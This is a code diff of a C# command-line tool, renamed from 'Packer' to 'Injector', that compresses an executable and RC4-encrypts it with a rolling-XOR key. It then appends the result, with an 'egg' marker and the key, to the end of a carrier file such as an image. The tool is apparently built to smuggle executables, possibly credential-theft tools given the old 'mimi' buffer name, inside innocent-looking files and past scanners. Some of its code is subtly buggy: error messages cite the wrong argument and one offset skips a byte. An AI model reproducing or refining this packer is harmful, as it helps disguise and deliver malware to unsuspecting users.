@@ -1,137 +1,178 @@
 using System;
-using System.Security.Cryptography;
+using System.IO;
+using System.Text;
+using System.Linq;
 using System.IO.Compression;
+using System.Collections.Generic;
 
-namespace Packer {
+namespace Injector {
     class Program {
-        static byte[] RC4(byte[] input, byte[] key) {
-            byte[] result = new byte[input.Length];
-            int x, y, j = 0;
-            int[] box = new int[256];
-            for (int i = 0; i < 256; i++)
+        public static byte[] Encrypt(byte[] pwd, byte[] data) {
+            int a, i, j, k, tmp;
+            int[] key, box;
+            byte[] cipher;
+
+            key = new int[256];
+            box = new int[256];
+            cipher = new byte[data.Length];
+
+            for (i = 0; i < 256; i++) {
+                key[i] = pwd[i % pwd.Length];
                 box[i] = i;
-            for (int i = 0; i < 256; i++) {
-                j = (key[i % key.Length] + box[i] + j) % 256;
-                x = box[i];
+            }
+            for (j = i = 0; i < 256; i++) {
+                j = (j + box[i] + key[i]) % 256;
+                tmp = box[i];
                 box[i] = box[j];
-                box[j] = x;
+                box[j] = tmp;
             }
-            for (int i = 0; i < input.Length; i++) {
-                y = i % 256;
-                j = (box[y] + j) % 256;
-                x = box[y];
-                box[y] = box[j];
-                box[j] = x;
-                result[i] = (byte)(input[i] ^ box[(box[y] + box[j]) % 256]);
+            for (a = j = i = 0; i < data.Length; i++) {
+                a++;
+                a %= 256;
+                j += box[a];
+                j %= 256;
+                tmp = box[a];
+                box[a] = box[j];
+                box[j] = tmp;
+                k = box[((box[a] + box[j]) % 256)];
+                cipher[i] = (byte)(data[i] ^ k);
             }
-            return result;
+            return cipher;
         }
 
-        public static byte[] RollingXor(string password) {
-            byte[] key = new byte[password.Length - 1];
-            key[0] = (byte)(password[0] ^ (byte)password[1]);
-            for (int i = 2; i <= key.Length; i++) {
-                byte next = (byte)(key[i - 1] ^ (byte)password[i]);
-                key[i - 1] = next;
+        public static byte[] RollingXor(byte[] password, bool decrypt) {
+            byte[] key = new byte[password.Length];
+            if (decrypt) {
+                Array.Reverse(password);
+                key[key.Length - 1] = password[password.Length - 1];
+                for (int i = password.Length - 2; i >= 0; i--)
+                    key[i] = (byte)(password[i + 1] ^ password[i]);
+                Array.Reverse(key);
+            } else {
+                key[0] = password[0];
+                for (int i = 1; i < key.Length; i++)
+                    key[i] = (byte)(key[i - 1] ^ password[i]);
             }
             return key;
         }
 
         public static void PrintBytes(byte[] bs) {
             for (int i = 0; i < bs.Length; i++) {
-                Console.Write(String.Format("0x{0} ", bs[i].ToString("X2")));
+                Console.Write(String.Format((i == bs.Length - 1) ? "0x{0}" : "0x{0},", bs[i].ToString("X2")));
             }
-            Console.Write("\n");
         }
-
-        static readonly string banner = "* * * * * * * * * * * * * * * *\n* ./encrypt <key> <img> <exe> <out> *\n* * * * * * * * * * * * * * * *\n*note: full paths please";
+        static readonly string title = @"
+ ______                                        __                         
+/      |                                      /  |                        
+$$$$$$/  _______      __   ______    _______ _$$ |_     ______    ______  
+  $$ |  /       \    /  | /      \  /       / $$   |   /      \  /      \ 
+  $$ |  $$$$$$$  |   $$/ /$$$$$$  |/$$$$$$$/$$$$$$/   /$$$$$$  |/$$$$$$  |
+  $$ |  $$ |  $$ |   /  |$$    $$ |$$ |       $$ | __ $$ |  $$ |$$ |  $$/ 
+ _$$ |_ $$ |  $$ |   $$ |$$$$$$$$/ $$ \_____  $$ |/  |$$ \__$$ |$$ |      
+/ $$   |$$ |  $$ |   $$ |$$       |$$       | $$  $$/ $$    $$/ $$ |      
+$$$$$$/ $$/   $$/_   $$ | $$$$$$$/  $$$$$$$/   $$$$/   $$$$$$/  $$/       
+               /  \__$$ |                                                 
+               $$    $$/                                                  
+                $$$$$$/                                                   
+";
+        static readonly string banner = @"
+                                         * * * * * * * * * * * * * * * * * * * * * *
+                                        * ./injector <key> <egg> <file> <exe> <out> *
+                                        *           note: use full paths           *
+                                         * * * * * * * * * * * * * * * * * * * * *";
 
         static void Main(string[] args) {
-            uint file_size_bytes = 0;
-            uint image_size_bytes = 0;
+            //Cannot run with PE larger than 4.199 GBs
+            Console.WriteLine(title);
 
-            if (args.Length != 4) {
-                Console.WriteLine(Program.banner);
+            if (args.Length != 5) {
+                Console.WriteLine(banner);
                 return;
+            }
+            if (args[0].Length < 2 || args[1].Length < 2) {
+                Console.WriteLine("Key must be greater than 1 byte!");
+                return;
+            }
+            if (!File.Exists(args[2])) {
+                Console.WriteLine("{0} does not exist!", args[1]);
+                return;
+            }
+            if (!File.Exists(args[3])) {
+                Console.WriteLine("{0} does not exist!", args[2]);
+                return;
+            }
+            if (File.Exists(args[4])) {
+                Console.WriteLine("Overwriting {0}...", args[4]);
+                File.Delete(args[4]);
             }
 
             string password = args[0];
-            string image_path = args[1]; // Could be anything that supports writing paste the EOF, I just am using images
-            string file_path = args[2];
-            string payload_path = args[3];
+            string egg = args[1];
+            string injected_path = args[2];
+            string pe_path = args[3];
+            string payload_path = args[4];
 
-            if (!System.IO.File.Exists(file_path)) {
-                Console.WriteLine("{0} does not exist!", file_path);
-                return;
+            byte[] key = RollingXor(Encoding.UTF8.GetBytes(password), false);
+
+            int egg_len = egg.Length;
+            int key_len = key.Length;
+
+            long in_file_len = new FileInfo(injected_path).Length;
+            string in_file_name = new FileInfo(injected_path).Name;
+            byte[] in_file_buf = new byte[in_file_len];
+
+            long injected_file_len = new FileInfo(pe_path).Length;
+            string injected_file_name = new FileInfo(pe_path).Name;
+            byte[] injected_buf = new byte[injected_file_len];
+
+            Console.WriteLine("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
+            Console.WriteLine("Password:\t\t\t\t\t{0}", password);
+            Console.WriteLine("Injected file:\t\t\t\t\t{0}", in_file_name);
+            Console.WriteLine("PE file:\t\t\t\t\t{0}", injected_file_name);
+            Console.WriteLine("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
+            Console.WriteLine("Injected file total size (on disk):\t\t{0}", in_file_len);
+            Console.WriteLine("PE file total size (on disk):\t\t\t{0}", injected_file_len);
+
+            using (FileStream fs = new FileStream(injected_path, FileMode.Open)) {
+                fs.Seek(0, SeekOrigin.Begin);
+                fs.Read(in_file_buf, 0, (int)in_file_len);
+                fs.Flush();
             }
-            if (!System.IO.File.Exists(image_path)) {
-                Console.WriteLine("{0} does not exist!", image_path);
-                return;
-            }
-            if (System.IO.File.Exists(payload_path)) {
-                Console.WriteLine("Overwriting {0}...", payload_path);
-                System.IO.File.Delete(payload_path);
+            using (FileStream fs = new FileStream(pe_path, FileMode.Open)) {
+                fs.Seek(0, SeekOrigin.Begin);
+                fs.Read(injected_buf, 0, (int)injected_file_len);
+                fs.Flush();
             }
 
-            byte[] key = RollingXor(password);
-            Console.Write("Key: ");
-            PrintBytes(key);
-
-            image_size_bytes = (uint)new System.IO.FileInfo(image_path).Length;
-            file_size_bytes = (uint)new System.IO.FileInfo(file_path).Length;
-
-            Console.WriteLine("Input file total size:\t{0}", file_size_bytes);
-
-            // Some DEADBEEF action here               v
-            byte[] image = new byte[image_size_bytes + 4 + file_size_bytes];
-
-            using (System.IO.Stream i = System.IO.File.Open(image_path, System.IO.FileMode.Open)) {
-                i.Seek(0, System.IO.SeekOrigin.Begin);
-                i.Read(image);
-                i.Dispose();
-                i.Close();
-            }
-            byte[] mimi = new byte[file_size_bytes];
-            using (System.IO.Stream m = System.IO.File.Open(file_path, System.IO.FileMode.Open)) {
-                m.Seek(0, System.IO.SeekOrigin.Begin);
-                m.Read(mimi);
-                m.Dispose();
-                m.Close();
-            }
-            Console.WriteLine("Image total size:\t{0}", image.Length);
-            // Magic
-            image[image_size_bytes + 1] = 0xDE;
-            image[image_size_bytes + 2] = 0xAD;
-            image[image_size_bytes + 3] = 0xBE;
-            image[image_size_bytes + 4] = 0xEF;
-            image_size_bytes += 4;
-
-            using (System.IO.MemoryStream ms = new System.IO.MemoryStream()) {
-                using (GZipStream gz = new GZipStream(ms, CompressionLevel.Optimal)) {
-                    gz.Write(mimi, 0, (int)file_size_bytes);
-                    ms.Seek(0, System.IO.SeekOrigin.Begin);
+            using (MemoryStream ms = new MemoryStream()) {
+                using (GZipStream gz = new GZipStream(ms, CompressionMode.Compress)) {
+                    new MemoryStream(injected_buf).CopyTo(gz);
                 }
+                byte[] encrypted_buf = Encrypt(Encoding.UTF8.GetBytes(password), ms.ToArray());
 
-                byte[] gz_bytes = mimi = Program.RC4(ms.ToArray(), key);
+                Console.WriteLine("Encrypted PE file size compressed:\t\t{0}", encrypted_buf.Length);
 
-                Console.WriteLine("GZ bytes:\t\t{0}", gz_bytes.Length);
+                byte[] out_buf = new byte[in_file_len + egg_len + 2 + key_len + encrypted_buf.Length];
 
-                for (int i = 0; i < gz_bytes.Length; i++) {
-                    image[image_size_bytes + i] = gz_bytes[i];
+                for (int i = 0; i < in_file_len; i++)
+                    out_buf[i] = in_file_buf[i];
+                for (int i = 0; i < egg_len; i++)
+                    out_buf[i + in_file_len] = (byte)egg[i];
+                out_buf[in_file_len + egg_len + 1] = (byte)key.Length;
+                for (int i = 0; i < key_len; i++)
+                    out_buf[i + (in_file_len + egg_len + 2)] = key[i];
+                for (int i = 0; i < encrypted_buf.Length; i++)
+                    out_buf[i + (in_file_len + egg_len + 2 + key_len)] = encrypted_buf[i];
+
+                Console.WriteLine("Payload to be written total size:\t\t{0}", out_buf.Length);
+
+                using (FileStream fs = new FileStream(payload_path, FileMode.CreateNew)) {
+                    fs.Write(out_buf, 0, out_buf.Length);
+                    fs.Flush();
                 }
-
-                image_size_bytes += (uint)gz_bytes.Length;
-
-                Console.WriteLine("Free bytes:\t\t{0}", ((int)file_size_bytes - (int)image_size_bytes));
-
-                using (System.IO.FileStream fs = new System.IO.FileStream(payload_path, System.IO.FileMode.CreateNew)) {
-                    fs.Write(image, 0, (int)image_size_bytes);
-                    fs.Dispose();
-                    fs.Close();
-                }
-                ms.Dispose();
-                ms.Close();
             }
+
+            Console.WriteLine("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
         }
     }
 }
